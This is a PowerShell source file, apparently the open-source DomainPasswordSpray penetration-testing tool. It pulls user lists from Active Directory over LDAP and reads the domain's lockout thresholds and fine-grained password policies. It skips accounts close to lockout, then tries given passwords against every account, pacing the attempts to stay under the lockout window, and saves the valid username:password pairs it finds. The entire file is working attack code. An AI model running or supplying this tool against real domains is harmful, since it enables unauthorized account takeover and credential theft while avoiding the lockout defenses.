function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    .PARAMETER UserList

    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password

    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList

    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).

    .PARAMETER OutFile

    A file to output the results to.

    .PARAMETER Domain

    The domain to spray against.
    
    .PARAMETER Force
    
    Forces the spray to continue and doesn't prompt for confirmation.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -Password Winter2016

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.


    #>
    Param(

     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $UserList = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $Password,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $PasswordList,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $OutFile,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [switch]     
     $Force
    )
    
    if ($Domain -ne "")
    {
        Try 
        {
            #Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        catch 
        {
            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."    
            break
        }
    }
    else 
    {
        Try 
        {
            #Trying to use the current user's domain
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
        catch 
        {
            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."    
            break
        }
    }

    if ($UserList -eq "")
    {
    $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts
    }
    else
    {
        #if a Userlist is specified use it and do not check for lockout thresholds
        Write-Host "[*] Using $UserList as userlist to spray with"
        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
        $UserListArray = @()
        try 
        {
            $UserListArray = Get-Content $UserList -ErrorAction stop
        }
        catch [Exception]{
            Write-Host -ForegroundColor "red" "$_.Exception"
            break
        }
    
    }

    # If a single password is selected do this
    if ($Password)
    {
        #if no force flag is set we will ask if the user is sure they want to spray
        if (!$Force)
        {
        $title = "Confirm Password Spray"
        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $result = $host.ui.PromptForChoice($title, $message, $options, 0) 

        switch ($result)
            {
                0 
                {
                    $time = Get-Date
                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
                    Write-Host "[*] This might take a while depending on the total number of users"
                    $curr_user = 0
                    $count = $UserListArray.count

                    ForEach($User in $UserListArray){
                    $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
                        If ($Domain_check.name -ne $null)
                        {
                            if ($OutFile -ne "")
                            {    
                                Add-Content $OutFile $User`:$Password
                            }
                        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
                        }
                        $curr_user+=1 
                        Write-Host -nonewline "$curr_user of $count users tested`r"
                        }
                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
                    if ($OutFile -ne "")
                    {
                    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
                    }
                
                }
                1 {"Cancelling the password spray."}
            }
        }
        #If the force flag is set don't bother asking if we are sure we want to spray.
        if ($Force)
        {
        $time = Get-Date
        Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
        Write-Host "[*] This might take a while depending on the total number of users"
        $curr_user = 0
        $count = $UserListArray.count

        ForEach($User in $UserListArray){
        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
            If ($Domain_check.name -ne $null)
            {
                if ($OutFile -ne "")
                {    
                    Add-Content $OutFile $User`:$Password
                }
            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
            }
            $curr_user+=1 
            Write-Host -nonewline "$curr_user of $count users tested`r"
            }
        Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
        if ($OutFile -ne "")
        {
        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
        }
        }


        
    }
        # If a password list is selected do this
    ElseIf($PasswordList){
        $Passwords = Get-Content $PasswordList
        #Get account lockout observation window to avoid running more than 1 password spray per observation window.
        $net_accounts = "cmd.exe /C net accounts /domain"
        $net_accounts_results = Invoke-Expression -Command:$net_accounts
        $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"}) 
        $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
        $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
        [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)

        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"    
        Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
        Write-Host "[*] Setting a $observation_window minute wait in between sprays."
        
        #if no force flag is set we will ask if the user is sure they want to spray
        if (!$Force)
        {
        $title = "Confirm Password Spray"
        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"

        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
            "Cancels the password spray."

        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

        $result = $host.ui.PromptForChoice($title, $message, $options, 0) 

        switch ($result)
            {
                0 
                {
                Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
                Write-Host "[*] This might take a while depending on the total number of users"

                ForEach($Password_Item in $Passwords){
                $time = Get-Date
                Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
                $curr_user = 0
                $count = $UserListArray.count

                ForEach($User in $UserListArray){
                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
                If ($Domain_check.name -ne $null)
                {
                    if ($OutFile -ne "")
                    {
                    Add-Content $OutFile $User`:$Password_Item
                    }
                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
                }
                $curr_user+=1 
                Write-Host -nonewline "$curr_user of $count users tested`r"
                }
                Countdown-Timer -Seconds (60*$observation_window)
            }
            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
            if ($OutFile -ne "")
            {
            Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
            }
                
                }
                1 {"Cancelling the password spray."}
            }
        }
        #if the force flag is set we will not bother asking about proceeding with password spray.
        if($Force)
        {
                Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
                Write-Host "[*] This might take a while depending on the total number of users"

                ForEach($Password_Item in $Passwords){
                $time = Get-Date
                Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
                $curr_user = 0
                $count = $UserListArray.count

                ForEach($User in $UserListArray){
                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
                If ($Domain_check.name -ne $null)
                {
                    if ($OutFile -ne "")
                    {
                    Add-Content $OutFile $User`:$Password_Item
                    }
                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
                }
                $curr_user+=1 
                Write-Host -nonewline "$curr_user of $count users tested`r"
                }
                Countdown-Timer -Seconds (60*$observation_window)
            }
            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
            if ($OutFile -ne "")
            {
            Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
            }
                
        }
    }
    Else{
    Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
    break
    }
}

Function Countdown-Timer
{   
    Param(
        $Seconds = 1800,
        $Message = "[*] Pausing to avoid account lockout."
    )
    ForEach ($Count in (1..$Seconds))
    {   Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
        Start-Sleep -Seconds 1
    }
    Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
}

Function Get-DomainUserList{

<#
    .SYNOPSIS

    This module gathers a userlist from the domain.
    
    DomainPasswordSpray Function: Get-DomainUserList
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module gathers a userlist from the domain.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER RemoveDisabled

    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))   
    
    .PARAMETER RemovePotentialLockouts
    
    Removes accounts within 1 attempt of locking out. 
    
    .EXAMPLE

    C:\PS> Get-DomainUserList

    Description
    -----------
    This command will gather a userlist from the domain including all samAccountType "805306368".
    
    .EXAMPLE

    C:\PS> Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt

    Description
    -----------
    This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"
    
    #>
    Param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $Domain = "",
     
     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $RemoveDisabled,
     
     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $RemovePotentialLockouts
    )
    
   if ($Domain -ne "")
    {
        Try 
        {
            #Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        catch 
        {
            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."    
            break
        }
    }
    else 
    {
        Try 
        {
            #Trying to use the current user's domain
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
        catch 
        {
            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."    
            break
        }
    }

    #Setting the current domain's account lockout threshold
    $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    $AccountLockoutThresholds = @()
    $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold

    #Getting the AD behavior version to determine if fine-grained password policies are possible
    $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
    if ($behaviorversion -ge 3)
    {
        #Determine if there are any fine-grained password policies
        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
        $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $ADSearcher.SearchRoot = $objDeDomain
        $ADSearcher.Filter = "(objectclass=msDS-PasswordSettings)"
        $PSOs = $ADSearcher.FindAll()

        if ( $PSOs.count -gt 0)
        {
            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
            foreach($entry in $PSOs)
            {
                #Selecting the lockout threshold, min pwd length, and which groups the fine-grained password policy applies to
                $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                $PSOPolicyName = $PSOFineGrainedPolicy.name
                $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
                $PSOAppliesTo = $PSOFineGrainedPolicy.'msds-psoappliesto'
                $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
                #adding lockout threshold to array for use later to determine which is the lowest.
                $AccountLockoutThresholds += $PSOLockoutThreshold

            Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
            }
        }

    }

        #Get account lockout observation window to avoid running more than 1 password spray per observation window.
        $net_accounts = "cmd.exe /C net accounts /domain"
        $net_accounts_results = Invoke-Expression -Command:$net_accounts
        $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"}) 
        $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
        $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
        [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)

        #Generate a userlist from the domain
        #Selecting the lowest account lockout threshold in the domain to avoid locking out any accounts. 
        [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
        Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
        
        if ($SmallestLockoutThreshold -eq "0")
        {
            Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
        }
        else
        {
            Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
        }
        
        $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
        $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
        $UserSearcher.SearchRoot = $DirEntry

        $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
        $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
        $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
        
        If ($RemoveDisabled){
                Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
                # more precise LDAP filter UAC check for users that are disabled (Joff Thyer)
                $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        }
        else
        {
                $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user))"
        }

        # grab batches of 1000 in results
        $UserSearcher.PageSize = 1000
        $AllUserObjects = $UserSearcher.FindAll()
        Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
        $UserListArray = @()
        
        If ($RemovePotentialLockouts)
        {
        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        Foreach ($user in $AllUserObjects)
            {
                #Getting bad password counts and lst bad password time for each user
                $badcount = $user.Properties.badpwdcount
                $samaccountname = $user.Properties.samaccountname
                try
                {
                    $badpasswordtime = $user.Properties.badpasswordtime[0]
                }
                catch
                {
                    continue
                }
                $currenttime = Get-Date
                $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
                $timedifference = ($currenttime - $lastbadpwd).TotalMinutes

                if ($badcount)
                {
                    
                    [int]$userbadcount = [convert]::ToInt32($badcount, 10)
                    $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
                    #if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
                    if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
                    {
                        $UserListArray += $samaccountname
                    }
                }
            }
        }
        else
        {
        Foreach ($user in $AllUserObjects)
            {
            $samaccountname = $user.Properties.samaccountname
            $UserListArray += $samaccountname
            }
        }
        
            Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
            return $UserListArray
}
